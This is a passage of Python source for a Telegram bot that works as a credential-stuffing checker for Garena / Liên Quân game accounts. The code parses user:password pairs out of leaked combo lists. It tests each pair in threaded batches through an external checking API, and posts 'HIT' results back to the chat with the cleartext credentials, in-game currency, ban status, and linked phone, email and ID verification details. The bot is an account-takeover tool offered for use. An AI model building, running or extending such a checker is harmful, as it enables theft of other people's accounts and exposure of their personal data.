console.log('🎵 AUTO AUDIO FIXED - 3D EFFECTS ENABLED');
</script>
</body>
</html>"""
        return html
    
    def log_message(self, format, *args):
        pass

def start_render_server():
    global start_time
    start_time = time.time()
    try:
        port = int(os.environ.get("PORT", 10000))
        server = HTTPServer(("0.0.0.0", port), RenderHandler)
        print(f"[*] Render web server chay tren port {port}")
        print(f"[*] Dashboard: http://0.0.0.0:{port}")
        print(f"[*] HIEU UNG 3D + HACKER DEP")
        print(f"[*] AM THANH TU DONG PHAT")
        print(f"[*] LUU THONG KE VAO {STATS_FILE}")
        print(f"[*] TRA KET QUA FULL INFO")
        server.serve_forever()
    except Exception as e:
        print(f"[!] Loi web server: {e}")

threading.Thread(target=start_render_server, daemon=True).start()

# ========== UTILITIES ==========
def rate_limit(delay=DEFAULT_DELAY):
    global last_request_time
    with rate_lock:
        current_time = time.time()
        time_since_last = current_time - last_request_time
        if time_since_last < delay:
            time.sleep(delay - time_since_last)
        last_request_time = time.time()

def fix_encoding(text):
    if not isinstance(text, str):
        return text
    replacements = {
        'Ã¡': 'á', 'Ã ': 'à', 'áº£': 'ả', 'Ã£': 'ã', 'áº¡': 'ạ',
        'Ä': 'Đ', 'Ä': 'Đ', 'Æ°': 'ư', 'Æ¡': 'ơ', 'Ã´': 'ô',
        'Ã¢': 'â', 'Äƒ': 'ă', 'Ãª': 'ê', 'Ã­': 'í', 'Ã¬': 'ì',
        'á»‹': 'ị', 'á»‰': 'ỉ', 'Ä©': 'ĩ', 'Ã³': 'ó', 'Ã²': 'ò',
        'Ãº': 'ú', 'Ã¹': 'ù', 'Ã½': 'ý', 'á»³': 'ỳ',
        'á»·': 'ỷ', 'á»µ': 'ỵ',
        'Nghiá»‡p': 'Nghiệp', 'Hoáº£': 'Hoả', 'YÃªu': 'Yêu', 'Háº­u': 'Hậu',
        'Tháº¿': 'Thế', 'Tá»­': 'Tử', 'Nguyá»‡t': 'Nguyệt', 'Tá»™c': 'Tộc',
        'SiÃªu': 'Siêu', 'viá»‡t': 'việt', 'Ngá»™': 'Ngộ', 'KhÃ´ng': 'Không',
        'Äao': 'Đao', 'phá»§': 'phủ', 'táº­n': 'tận', 'tháº¿': 'thế',
        'Giai': 'Giai', 'Ä‘iá»‡u': 'điệu', 'GiÃ¡ng': 'Giáng', 'Sinh': 'Sinh',
        'Äá»“ng': 'Đồng', 'phá»¥c': 'phục', 'Cáº¥p': 'Cấp', 'Tá»‘i': 'Tối', 
        'ThÆ°á»£ng': 'Thượng', 'hÃ nh': 'hành', 'K.CÆ°Æ¡ng': 'K.Cương',
        'Tel\'Annas': "Tel'Annas", 'VÅ©': 'Vũ', 'khÃºc': 'khúc', 'yÃªu': 'yêu',
        'Ã¡': 'á', 'Ã¢': 'â', 'Äƒ': 'ă', 'áº¯': 'ắ', 'áº±': 'ằ',
        'áº³': 'ẳ', 'áºµ': 'ẵ', 'áº·': 'ặ', 'áº¥': 'ấ', 'áº§': 'ầ',
        'áº©': 'ẩ', 'áº«': 'ẫ', 'áº­': 'ậ', 'á»“': 'ồ', 'á»•': 'ổ',
        'á»—': 'ỗ', 'á»™': 'ộ', 'á»': 'ở', 'á»¡': 'ỡ', 'á»£': 'ợ',
        'á»§': 'ủ', 'Å©': 'ũ', 'á»¥': 'ụ', 'Ã¹': 'ù', 'Ãº': 'ú',
        'á»©': 'ứ', 'á»«': 'ừ', 'á»­': 'ử', 'á»¯': 'ữ', 'á»±': 'ự',
        'á»‰': 'ỉ', 'á»‹': 'ị', 'áº¹': 'ẻ', 'áº»': 'ẻ', 'áº½': 'ẽ',
        'áº¹': 'ẹ', 'á»‰': 'ỉ', 'á»‹': 'ị'
    }
    for old, new in replacements.items():
        text = text.replace(old, new)
    if any(char in text for char in ['Ã', 'Ä', 'Æ', 'á»', 'áº', 'Å©', 'Ä©']):
        try:
            fixed = text.encode('latin-1', errors='ignore').decode('utf-8', errors='ignore')
            if fixed != text and len(fixed) > 0:
                text = fixed
        except:
            pass
    return text

def is_user_member(user_id):
    try:
        chat_member = bot.get_chat_member(REQUIRED_CHANNEL_ID, user_id)
        return chat_member.status in ['member', 'administrator', 'creator']
    except Exception as e:
        print(f"[!] Loi kiem tra thanh vien: {e}")
        return False

def check_membership(message):
    user_id = message.from_user.id
    if is_user_member(user_id):
        return True
    markup = telebot.types.InlineKeyboardMarkup()
    join_button = telebot.types.InlineKeyboardButton(text="📢 THAM GIA KENH BAT BUOC", url=REQUIRED_CHANNEL_URL)
    check_button = telebot.types.InlineKeyboardButton(text="✅ TOI DA THAM GIA", callback_data="check_join")
    markup.add(join_button)
    markup.add(check_button)
    safe_send_message(message.chat.id, f"""🔒 <b>BAN CHUA THAM GIA KENH BAT BUOC!</b>

📢 Vui long tham gia kenh sau de su dung bot:
👉 <a href="{REQUIRED_CHANNEL_URL}"><b>{REQUIRED_CHANNEL}</b></a>

Sau khi tham gia, bam nut ben duoi de xac nhan!""", parse_mode="HTML")
    try:
        bot.send_message(message.chat.id, "👇 Xac nhan sau khi tham gia:", reply_markup=markup)
    except:
        pass
    return False

@bot.callback_query_handler(func=lambda call: call.data == "check_join")
def callback_check_join(call):
    user_id = call.from_user.id
    if is_user_member(user_id):
        bot.answer_callback_query(call.id, "✅ Xac nhan thanh cong!")
        bot.delete_message(call.message.chat.id, call.message.message_id)
        safe_send_message(call.message.chat.id, "✅ <b>XAC NHAN THANH CONG!</b>\n\nChao mung ban den voi bot!\nDung /start de xem huong dan.")
    else:
        bot.answer_callback_query(call.id, "❌ Ban chua tham gia kenh!", show_alert=True)
        safe_send_message(call.message.chat.id, f"""❌ <b>BAN CHUA THAM GIA KENH!</b>

Vui long tham gia: <a href="{REQUIRED_CHANNEL_URL}"><b>{REQUIRED_CHANNEL}</b></a>
Sau do bam nut xac nhan lai.""")

def safe_send_message(chat_id, text, parse_mode="HTML"):
    if not text:
        return
    text = fix_encoding(text)
    if len(text) > MAX_MESSAGE_LENGTH:
        parts = []
        current_part = ""
        lines = text.split('\n')
        for line in lines:
            if len(current_part) + len(line) + 1 > MAX_MESSAGE_LENGTH:
                parts.append(current_part)
                current_part = line + '\n'
            else:
                current_part += line + '\n'
        if current_part:
            parts.append(current_part)
        for part in parts:
            try:
                bot.send_message(chat_id, part.strip(), parse_mode=parse_mode)
                time.sleep(0.1)
            except Exception as e:
                print(f"[!] Loi gui tin nhan: {e}")
                try:
                    bot.send_message(chat_id, part.strip())
                except:
                    pass
    else:
        try:
            bot.send_message(chat_id, text, parse_mode=parse_mode)
        except Exception as e:
            print(f"[!] Loi gui tin nhan: {e}")
            try:
                bot.send_message(chat_id, text)
            except:
                pass

def loc_tk_mk_only(content):
    accounts = []
    seen = set()
    stats_loc = {"total": 0, "valid": 0, "invalid": 0, "duplicate": 0}
    if not content:
        return accounts, stats_loc
    pattern_colon = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@+-]{1,80}):([a-zA-Z0-9_.@!$%^&*()\-+]{1,100})(?![a-zA-Z0-9_])'
    pattern_pipe = r'(?<![a-zA-Z0-9_])([a-zA-Z0-9][a-zA-Z0-9_.@+-]{1,80})\|([a-zA-Z0-9_.@!$%^&*()\-+]{1,100})(?![a-zA-Z0-9_])'
    lines = content.split('\n')
    stats_loc["total"] = len(lines)
    for line in lines:
        line = line.strip()
        if not line:
            continue
        if re.match(r'^\d{1,2}:\d{2}(:\d{2})?$', line):
            continue
        if re.match(r'^\d+$', line):
            continue
        matches = re.findall(pattern_colon, line)
        if matches:
            for user, pwd in matches:
                if is_time_value(user) or is_time_value(pwd):
                    continue
                if is_valid_account(user, pwd):
                    key = f"{user}:{pwd}"
                    if key not in seen:
                        seen.add(key)
                        accounts.append((user, pwd))
                        stats_loc["valid"] += 1
                    else:
                        stats_loc["duplicate"] += 1
                else:
                    stats_loc["invalid"] += 1
            continue
        matches = re.findall(pattern_pipe, line)
        if matches:
            for user, pwd in matches:
                if is_time_value(user) or is_time_value(pwd):
                    continue
                if is_valid_account(user, pwd):
                    key = f"{user}:{pwd}"
                    if key not in seen:
                        seen.add(key)
                        accounts.append((user, pwd))
                        stats_loc["valid"] += 1
                    else:
                        stats_loc["duplicate"] += 1
                else:
                    stats_loc["invalid"] += 1
    if not accounts:
        all_matches = re.findall(pattern_colon, content)
        for user, pwd in all_matches:
            if is_time_value(user) or is_time_value(pwd):
                continue
            if is_valid_account(user, pwd):
                key = f"{user}:{pwd}"
                if key not in seen:
                    seen.add(key)
                    accounts.append((user, pwd))
                    stats_loc["valid"] += 1
                else:
                    stats_loc["duplicate"] += 1
            else:
                stats_loc["invalid"] += 1
        if not accounts:
            all_matches = re.findall(pattern_pipe, content)
            for user, pwd in all_matches:
                if is_time_value(user) or is_time_value(pwd):
                    continue
                if is_valid_account(user, pwd):
                    key = f"{user}:{pwd}"
                    if key not in seen:
                        seen.add(key)
                        accounts.append((user, pwd))
                        stats_loc["valid"] += 1
                    else:
                        stats_loc["duplicate"] += 1
                else:
                    stats_loc["invalid"] += 1
    return accounts, stats_loc

def is_time_value(value):
    if not value:
        return False
    value = str(value).strip()
    time_patterns = [
        r'^\d{1,2}:\d{2}(:\d{2})?$',
        r'^\d{1,2}:\d{2}(:\d{2})?\s*(AM|PM|am|pm)$',
        r'^\d{1,2}\.\d{2}(\.\d{2})?$',
        r'^\d{1,2}-\d{2}(-\d{2})?$',
        r'^\d{1,2}/\d{2}(/\d{2,4})?$',
        r'^\d{4}-\d{2}-\d{2}$',
        r'^\d{4}/\d{2}/\d{2}$',
        r'^\d{2}-\d{2}-\d{4}$',
        r'^\d{2}/\d{2}/\d{4}$',
        r'^\d{1,2}h\d{2}(p\d{2})?$',
        r'^\d{1,2}giờ\d{2}$',
        r'^\d{1,2}:\d{2}:\d{2}\.\d+$',
        r'^\d+:\d+$',
        r'^\d+\.\d+$',
        r'^\d+-\d+$',
        r'^\d{10,13}$',
        r'^\d{1,2}\s*(AM|PM|am|pm)$',
    ]
    for pattern in time_patterns:
        if re.match(pattern, value, re.IGNORECASE):
            return True
    return False

def is_valid_account(user, pwd):
    if len(user) < 2 or len(pwd) < 1:
        return False
    if len(user) > 80 or len(pwd) > 100:
        return False
    if is_time_value(user) or is_time_value(pwd):
        return False
    if re.match(r'^\d+$', user) or re.match(r'^\d+$', pwd):
        return False
    user_lower = user.lower()
    skip_keywords = ['time', 'date', 'ngay', 'thoi_gian', 'thoigian', 'gio', 'giờ', 
                     'phut', 'phút', 'giay', 'giây', 'timestamp', 'datetime',
                     'created', 'login', 'session', 'expires', 'expire', 'valid',
                     'http', 'https', 'www', 'com', 'net', 'org', 'shop', 'share', 
                     'final', 'name', 'level', 'rank', 'status', 'email', 'phone', 
                     'sdt', 'cccd', 'fb', 'ban', 'ss', 'sss', 'anime', 'other', 
                     'am', 'pm', 'utc', 'gmt']
    for keyword in skip_keywords:
        if keyword in user_lower:
            return False
    if not re.match(r'^[a-zA-Z0-9][a-zA-Z0-9_.@+-]*$', user):
        return False
    if not re.match(r'^[a-zA-Z0-9_.@!$%^&*()\-+]+$', pwd):
        return False
    return True

def save_loc_file(accounts):
    with file_lock:
        with open(OUTPUT_LOC, 'w', encoding='utf-8') as f:
            for user, pwd in accounts:
                f.write(f"{user}:{pwd}\n")

def load_stats():
    try:
        if os.path.exists(STATS_FILE):
            with open(STATS_FILE, 'r', encoding='utf-8') as f:
                return json.load(f)
    except:
        pass
    return {"total_checked": 0, "total_hits": 0, "total_dead": 0, "total_errors": 0, "last_check": None, "history": []}

def save_stats(stats_data):
    try:
        with open(STATS_FILE, 'w', encoding='utf-8') as f:
            json.dump(stats_data, f, ensure_ascii=False, indent=2)
    except:
        pass

def update_stats(hit_count=0, dead_count=0, error_count=0, accounts=None, account_details=None):
    stats_data = load_stats()
    stats_data["total_checked"] += hit_count + dead_count + error_count
    stats_data["total_hits"] += hit_count
    stats_data["total_dead"] += dead_count
    stats_data["total_errors"] += error_count
    stats_data["last_check"] = datetime.now().isoformat()
    if accounts:
        stats_data["history"].append({
            "time": datetime.now().isoformat(),
            "total": len(accounts),
            "hits": hit_count,
            "dead": dead_count,
            "errors": error_count
        })
        if len(stats_data["history"]) > 50:
            stats_data["history"] = stats_data["history"][-50:]
    with SESSION_LOCK:
        SESSION_STATS["total_checked"] += hit_count + dead_count + error_count
        SESSION_STATS["total_hits"] += hit_count
        SESSION_STATS["total_dead"] += dead_count
        SESSION_STATS["total_errors"] += error_count
        if account_details:
            SESSION_STATS["accounts_checked"].extend(account_details)
            SESSION_STATS["recent_checks"].extend(account_details[-10:])
            if len(SESSION_STATS["accounts_checked"]) > 1000:
                SESSION_STATS["accounts_checked"] = SESSION_STATS["accounts_checked"][-1000:]
            if len(SESSION_STATS["recent_checks"]) > 50:
                SESSION_STATS["recent_checks"] = SESSION_STATS["recent_checks"][-50:]
    save_stats(stats_data)
    return stats_data

def check_account_api(username, password, service, use_delay=True):
    if use_delay:
        rate_limit(DEFAULT_DELAY)
    cache_key = f"{username}:{password}:{service}"
    with cache_lock:
        if cache_key in cache_results:
            return cache_results[cache_key]
    service_info = SERVICE_ROUTES.get(service, {})
    route = service_info.get("route", "/api/lienquan")
    param_names = service_info.get("params", ["tk", "mk"])
    extra_params = service_info.get("extra_params", {})
    url = f"{API_BASE}{route}"
    params = {"username": API_USERNAME, "password": API_PASSWORD}
    if len(param_names) >= 2:
        params[param_names[0]] = username
        params[param_names[1]] = password
    else:
        params["tk"] = username
        params["mk"] = password
    headers = {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36", "Accept": "application/json", "Content-Type": "application/json", "Connection": "keep-alive"}
    for attempt in range(DEFAULT_RETRIES):
        try:
            resp = requests.get(url, params=params, headers=headers, timeout=DEFAULT_TIMEOUT)
            if resp.status_code == 200:
                try:
                    result_data = resp.json()
                    if isinstance(result_data, dict):
                        for key, value in result_data.items():
                            if isinstance(value, str):
                                result_data[key] = fix_encoding(value)
                            elif isinstance(value, list):
                                result_data[key] = [fix_encoding(item) if isinstance(item, str) else item for item in value]
                            elif isinstance(value, dict):
                                for sub_key, sub_value in value.items():
                                    if isinstance(sub_value, str):
                                        value[sub_key] = fix_encoding(sub_value)
                    if isinstance(result_data, dict):
                        is_hit = False
                        status_val = result_data.get("status")
                        if status_val is not None:
                            if status_val in [True, "true", 1, "1", "True", "TRUE", "success", "Success", "SUCCESS", "HIT", "hit"]:
                                is_hit = True
                            elif status_val in [False, "false", 0, "0", "False", "FALSE", "fail", "Fail", "FAIL", "dead", "Dead", "DEAD"]:
                                is_hit = False
                        success_val = result_data.get("success")
                        if not is_hit and success_val is not None:
                            if success_val in [True, "true", 1, "1", "True", "TRUE"]:
                                is_hit = True
                            elif success_val in [False, "false", 0, "0", "False", "FALSE"]:
                                is_hit = False
                        result_val = result_data.get("result")
                        if result_val is not None:
                            result_str = str(result_val).lower()
                            if result_str in ["hit", "true", "success", "valid", "1", "live", "ok"]:
                                is_hit = True
                            elif result_str in ["dead", "false", "fail", "invalid", "0", "die", "error"]:
                                is_hit = False
                        message_val = result_data.get("message", "")
                        if message_val:
                            msg_lower = str(message_val).lower()
                            if any(word in msg_lower for word in ["thanh cong", "success", "valid", "hit", "live", "ok"]):
                                is_hit = True
                            elif any(word in msg_lower for word in ["that bai", "fail", "invalid", "dead", "error"]):
                                is_hit = False
                        data_val = result_data.get("data")
                        if data_val is not None:
                            if isinstance(data_val, (dict, list, str)) and data_val:
                                is_hit = True
                        info_fields = ["uid", "id", "name", "nickname", "account", "info", "user", "player", "level", "rank", "email", "phone", "sdt", "shells", "aov_name", "aov_level", "aov_rank", "aov_total_skins", "aov_total_champs", "fc_name", "fc_ovr", "garena_created", "last_login", "region", "aov_ss", "aov_sss", "aov_anime"]
                        for field in info_fields:
                            if field in result_data and result_data[field] is not None and result_data[field] != "":
                                is_hit = True
                                break
                        result_data["result"] = "hit" if is_hit else "dead"
                        with cache_lock:
                            cache_results[cache_key] = result_data
                        return result_data
                    else:
                        result = {"result": "unknown"}
                        with cache_lock:
                            cache_results[cache_key] = result
                        return result
                except json.JSONDecodeError:
                    text_lower = resp.text.lower()
                    if any(word in text_lower for word in ["success", "ok", "true", "hit", "valid", "live"]):
                        result = {"result": "hit"}
                    elif any(word in text_lower for word in ["fail", "false", "dead", "invalid", "error", "die"]):
                        result = {"result": "dead"}
                    else:
                        result = {"result": "unknown"}
                    with cache_lock:
                        cache_results[cache_key] = result
                    return result
            elif resp.status_code == 429:
                retry_after = resp.headers.get("Retry-After", "5")
                try:
                    wait_time = int(retry_after)
                except:
                    wait_time = 5 * (attempt + 1)
                time.sleep(wait_time)
                continue
            elif resp.status_code == 401:
                result = {"result": "error", "_error": "Invalid API credentials"}
                with cache_lock:
                    cache_results[cache_key] = result
                return result
            elif resp.status_code == 403:
                result = {"result": "error", "_error": "Forbidden access"}
                with cache_lock:
                    cache_results[cache_key] = result
                return result
            else:
                time.sleep(2)
                continue
        except requests.exceptions.Timeout:
            if attempt < DEFAULT_RETRIES - 1:
                time.sleep(3)
                continue
        except requests.exceptions.ConnectionError:
            if attempt < DEFAULT_RETRIES - 1:
                time.sleep(5)
                continue
        except Exception:
            if attempt < DEFAULT_RETRIES - 1:
                time.sleep(3)
                continue
    result = {"result": "error", "_error": "All retries failed"}
    with cache_lock:
        cache_results[cache_key] = result
    return result

def format_full_info(username, password, service, result_data):
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    icon = SERVICE_ROUTES.get(service, {}).get("icon", "✅")
    
    field_map = {
        "uid": "👤 UID", "aov_uid": "👤 UID", "id": "👤 UID",
        "region": "🌐 Region",
        "shells": "💲 Sò", "aov_shells": "💲 Sò",
        "nap_so": "💰 Nạp sò", "nap_time": "💰 Nạp sò",
        "email_verified": "📩 EMAIL", "email": "📩 EMAIL",
        "phone_verified": "📱 SĐT", "phone": "📱 SĐT", "sdt": "📱 SĐT",
        "password_set": "🛡 PASS", "pass_set": "🛡 PASS",
        "fb_linked": "🔗 FB", "fb": "🔗 FB",
        "banned": "🚫 BAND", "ban": "🚫 BAND", "is_ban": "🚫 BAND", "band": "🚫 BAND",
        "last_login": "⏰ Login cuối", "last_login_time": "⏰ Login cuối",
        "garena_created": "📅 Tạo GR", "created_time": "📅 Tạo GR",
        "aov_name": "🔥 NAME", "nickname": "🔥 NAME", "name": "🔥 NAME",
        "aov_rank": "👑 RANK", "rank": "👑 RANK",
        "aov_level": "✨ LEVEL", "level": "✨ LEVEL",
        "aov_total_skins": "💎 SKIN", "total_skins": "💎 SKIN", "skins": "💎 SKIN",
        "aov_total_champs": "💪 HERO", "total_champs": "💪 HERO", "champs": "💪 HERO",
        "aov_qh": "⚡️ QH", "qh": "⚡️ QH",
        "cccd": "📄 CCCD",
        "authen": "🛡 Authen",
        "aov_ss": "✨ SS", "ss": "✨ SS",
        "aov_anime": "🔥 Anime", "anime": "🔥 Anime",
        "aov_other": "🎲 Other", "other": "🎲 Other",
        "tinh_trang": "📋 Tình Trạng", "status_note": "📋 Tình Trạng",
        "aov_ss_list": "✨ SS", "aov_anime_list": "🔥 Anime", "aov_other_list": "🎲 Other",
        "ss_list": "✨ SS", "anime_list": "🔥 Anime", "other_list": "🎲 Other",
    }
    
    display_order = [
        "👤 UID", "🌐 Region", "💲 Sò", "💰 Nạp sò", "📩 EMAIL",
        "📱 SĐT", "🛡 PASS", "🔗 FB", "🚫 BAND", "⏰ Login cuối",
        "📅 Tạo GR", "🔥 NAME", "👑 RANK", "✨ LEVEL", "💎 SKIN",
        "💪 HERO", "⚡️ QH", "📄 CCCD", "🛡 Authen", "✨ SS",
        "🔥 Anime", "🎲 Other", "📋 Tình Trạng"
    ]
    
    info_dict = {}
    data = result_data.get("data", result_data) if isinstance(result_data, dict) else result_data
    
    sources = []
    if isinstance(data, dict):
        sources.append(data)
    if isinstance(result_data, dict):
        sources.append(result_data)
    
    for source in sources:
        for key, value in source.items():
            if key in field_map:
                label = field_map[key]
                if label not in info_dict or info_dict[label] is None:
                    info_dict[label] = value
    
    # Xử lý boolean
    if "📩 EMAIL" in info_dict:
        val = info_dict["📩 EMAIL"]
        if isinstance(val, bool):
            info_dict["📩 EMAIL"] = "Chưa Xác Thực [Yes]" if val else "Chưa Xác Thực [No]"
        elif isinstance(val, str):
            if val.lower() in ["true", "yes", "1"]:
                info_dict["📩 EMAIL"] = "Chưa Xác Thực [Yes]"
            elif val.lower() in ["false", "no", "0"]:
                info_dict["📩 EMAIL"] = "Chưa Xác Thực [No]"
    
    if "📱 SĐT" in info_dict:
        val = info_dict["📱 SĐT"]
        if isinstance(val, bool):
            info_dict["📱 SĐT"] = "Yes" if val else "No"
        elif isinstance(val, str):
            if val.lower() in ["true", "yes", "1"]:
                info_dict["📱 SĐT"] = "Yes"
            elif val.lower() in ["false", "no", "0"]:
                info_dict["📱 SĐT"] = "No"
    
    if "🛡 PASS" in info_dict:
        val = info_dict["🛡 PASS"]
        if isinstance(val, bool):
            info_dict["🛡 PASS"] = "Yes" if val else "No"
        elif isinstance(val, str):
            if val.lower() in ["true", "yes", "1"]:
                info_dict["🛡 PASS"] = "Yes"
            elif val.lower() in ["false", "no", "0"]:
                info_dict["🛡 PASS"] = "No"
    
    if "🔗 FB" in info_dict:
        val = info_dict["🔗 FB"]
        if isinstance(val, bool):
            info_dict["🔗 FB"] = "Yes" if val else "NO"
        elif isinstance(val, str):
            if val.lower() in ["true", "yes", "1"]:
                info_dict["🔗 FB"] = "Yes"
            elif val.lower() in ["false", "no", "0"]:
                info_dict["🔗 FB"] = "NO"
    
    if "🚫 BAND" in info_dict:
        val = info_dict["🚫 BAND"]
        if isinstance(val, bool):
            info_dict["🚫 BAND"] = "Yes" if val else "NO"
        elif isinstance(val, str):
            if val.lower() in ["true", "yes", "1"]:
                info_dict["🚫 BAND"] = "Yes"
            elif val.lower() in ["false", "no", "0"]:
                info_dict["🚫 BAND"] = "NO"
    
    if "📄 CCCD" in info_dict:
        val = info_dict["📄 CCCD"]
        if isinstance(val, bool):
            info_dict["📄 CCCD"] = "Yes" if val else "No"
        elif isinstance(val, str):
            if val.lower() in ["true", "yes", "1"]:
                info_dict["📄 CCCD"] = "Yes"
            elif val.lower() in ["false", "no", "0"]:
                info_dict["📄 CCCD"] = "No"
    
    if "🛡 Authen" in info_dict:
        val = info_dict["🛡 Authen"]
        if isinstance(val, bool):
            info_dict["🛡 Authen"] = "Yes" if val else "No"
        elif isinstance(val, str):
            if val.lower() in ["true", "yes", "1"]:
                info_dict["🛡 Authen"] = "Yes"
            elif val.lower() in ["false", "no", "0"]:
                info_dict["🛡 Authen"] = "No"
    
    # Xử lý list SS/Anime/Other - Ưu tiên list
    for label, list_keys in [
        ("✨ SS", ["aov_ss_list", "ss_list", "aov_ss", "ss"]),
        ("🔥 Anime", ["aov_anime_list", "anime_list", "aov_anime", "anime"]),
        ("🎲 Other", ["aov_other_list", "other_list", "aov_other", "other"]),
    ]:
        for key in list_keys:
            if key in result_data and result_data[key] is not None:
                val = result_data[key]
                if isinstance(val, list) and val:
                    info_dict[label] = f"{len(val)} [{', '.join([fix_encoding(str(x)) for x in val])}]"
                    break
                elif isinstance(val, (int, float)) and val > 0:
                    info_dict[label] = str(val)
                    break
    
    # Xử lý thời gian
    if "⏰ Login cuối" in info_dict:
        val = info_dict["⏰ Login cuối"]
        if isinstance(val, (int, float)) and val > 1000000000:
            info_dict["⏰ Login cuối"] = datetime.fromtimestamp(val).strftime('%Y-%m-%d %H:%M:%S')
    
    if "📅 Tạo GR" in info_dict:
        val = info_dict["📅 Tạo GR"]
        if isinstance(val, (int, float)) and val > 1000000000:
            info_dict["📅 Tạo GR"] = datetime.fromtimestamp(val).strftime('%H:%M:%S %d-%m-%Y')
    
    if "💰 Nạp sò" in info_dict:
        val = info_dict["💰 Nạp sò"]
        if isinstance(val, (int, float)) and val > 1000000000:
            info_dict["💰 Nạp sò"] = datetime.fromtimestamp(val).strftime('%d/%m/%Y')
        elif isinstance(val, (int, float)) and val == 0:
            info_dict["💰 Nạp sò"] = "01/01/1970"
    
    # Build message
    msg = f"✅ HIT\n🔑 <code>{username}:{password}</code>\n"
    
    for label in display_order:
        if label in info_dict:
            value = info_dict[label]
            if value is not None and value != "" and value != "N/A":
                msg += f"{label}: <code>{fix_encoding(str(value))}</code>\n"
    
    return msg

def format_dead_info(username, password, service):
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    icon = SERVICE_ROUTES.get(service, {}).get("icon", "❌")
    return f"{icon} <b>DEAD - {service_desc}</b>\n🔑 <code>{username}:{password}</code>"

def format_error_info(username, password, service):
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    icon = SERVICE_ROUTES.get(service, {}).get("icon", "⚠️")
    return f"{icon} <b>ERROR - {service_desc}</b>\n🔑 <code>{username}:{password}</code>"

def check_single(chat_id, username, password, service="lienquan"):
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    safe_send_message(chat_id, f"🔍 Dang check <code>{username}:{password}</code> voi {service_desc}...")
    result = check_account_api(username, password, service, use_delay=False)
    result_type = result.get("result", "unknown")
    account_detail = {"user": username, "pwd": password, "service": service, "status": result_type, "time": datetime.now().strftime("%H:%M:%S")}
    if result_type == "hit":
        safe_send_message(chat_id, format_full_info(username, password, service, result))
        update_stats(hit_count=1, account_details=[account_detail])
    elif result_type == "dead":
        safe_send_message(chat_id, format_dead_info(username, password, service))
        update_stats(dead_count=1, account_details=[account_detail])
    else:
        safe_send_message(chat_id, format_error_info(username, password, service))
        update_stats(error_count=1, account_details=[account_detail])

def check_batch(chat_id, accounts, service):
    global checking, stats
    if checking:
        safe_send_message(chat_id, "⚠️ Dang check roi!")
        return
    checking = True
    stop_event.clear()
    total = len(accounts)
    stats = {"total": total, "checked": 0, "hits": 0, "dead": 0, "errors": 0, "unknown": 0, "start_time": time.time()}
    service_desc = SERVICE_ROUTES.get(service, {}).get("desc", service)
    icon = SERVICE_ROUTES.get(service, {}).get("icon", "🔍")
    safe_send_message(chat_id, f"""{icon} <b>BAT DAU CHECK - V6.1</b>
📊 Tong: <code>{total}</code> accounts
🎯 Service: <b>{service_desc}</b>
⚡ Threads: <code>{CHECKMULTI_THREADS}</code>
⏱ Delay: <code>{CHECKMULTI_DELAY}s</code>
📦 Batch: <code>{CHECKMULTI_BATCH_SIZE} acc/batch</code>""")
    batches = []
    for i in range(0, total, CHECKMULTI_BATCH_SIZE):
        batches.append(accounts[i:i + CHECKMULTI_BATCH_SIZE])
    total_batches = len(batches)
    batch_num = 0
    all_results = []
    def process_single(user, pwd):
        if stop_event.is_set():
            return
        rate_limit(CHECKMULTI_DELAY)
        result = check_account_api(user, pwd, service, use_delay=False)
        result_type = result.get("result", "unknown")
        account_detail = {"user": user, "pwd": pwd, "service": service, "status": result_type, "time": datetime.now().strftime("%H:%M:%S")}
        all_results.append(account_detail)
        with stats_lock:
            stats["checked"] += 1
            if result_type == "hit":
                stats["hits"] += 1
                try:
                    safe_send_message(chat_id, format_full_info(user, pwd, service, result))
                except Exception as e:
                    print(f"[!] Loi gui hit: {e}")
            elif result_type == "dead":
                stats["dead"] += 1
            else:
                stats["errors"] += 1
    for batch in batches:
        if stop_event.is_set():
            break
        batch_num += 1
        safe_send_message(chat_id, f"📦 <b>BATCH {batch_num}/{total_batches}</b> - 🔍 Dang check {len(batch)} accounts...")
        with ThreadPoolExecutor(max_workers=CHECKMULTI_THREADS) as executor:
            futures = {executor.submit(process_single, user, pwd): (user, pwd) for user, pwd in batch}
            for future in as_completed(futures):
                if stop_event.is_set():
                    executor.shutdown(wait=False)
                    break
        elapsed = time.time() - stats["start_time"]
        speed = stats["checked"] / elapsed if elapsed > 0 else 0
        percent = (stats["checked"] / total) * 100
        safe_send_message(chat_id, f"""📊 <b>TIEN DO - {stats['checked']}/{total}</b> ({percent:.1f}%)
✅ Hits: <code>{stats['hits']}</code> | ❌ Dead: <code>{stats['dead']}</code> | ⚠️ Errors: <code>{stats['errors']}</code>
⚡ Speed: <code>{speed:.1f}</code> acc/s""")
        if batch_num < total_batches:
            time.sleep(CHECKMULTI_BATCH_DELAY)
    checking = False
    elapsed = time.time() - stats["start_time"]
    update_stats(hit_count=stats["hits"], dead_count=stats["dead"], error_count=stats["errors"], accounts=accounts, account_details=all_results)
    summary = f"""✅ <b>CHECK HOAN TAT!</b>
━━━━━━━━━━━━━━━━━━━━━━
📊 Tong: <code>{stats['total']}</code>
🎯 HIT: <code>{stats['hits']}</code>
❌ DEAD: <code>{stats['dead']}</code>
⚠️ ERROR: <code>{stats['errors']}</code>
⏱ Thoi gian: <code>{elapsed:.1f}s</code>
⚡ Speed: <code>{stats['checked']/elapsed:.1f}</code> acc/s
━━━━━━━━━━━━━━━━━━━━━━"""
    hits_list = [r for r in all_results if r["status"] == "hit"]
    if hits_list:
        summary += f"\n📌 <b>HIT LIST ({len(hits_list)}):</b>\n"
        for r in hits_list[:20]:
            summary += f"✅ <code>{r['user']}:{r['pwd']}</code>\n"
        if len(hits_list) > 20:
            summary += f"... va {len(hits_list) - 20} hits khac"
    dead_list = [r for r in all_results if r["status"] == "dead"]
    if dead_list and len(dead_list) <= 20:
        summary += f"\n❌ <b>DEAD LIST ({len(dead_list)}):</b>\n"
        for r in dead_list[:10]:
            summary += f"❌ <code>{r['user']}:{r['pwd']}</code>\n"
        if len(dead_list) > 10:
            summary += f"... va {len(dead_list) - 10} dead khac"
    safe_send_message(chat_id, summary)
    try:
        with open(STATS_FILE, 'r', encoding='utf-8') as f:
            bot.send_document(chat_id, f, caption=f"📊 check_stats.json - {stats['hits']} hits")
    except:
        pass

def check_all_services(chat_id, accounts):
    global checking
    if checking:
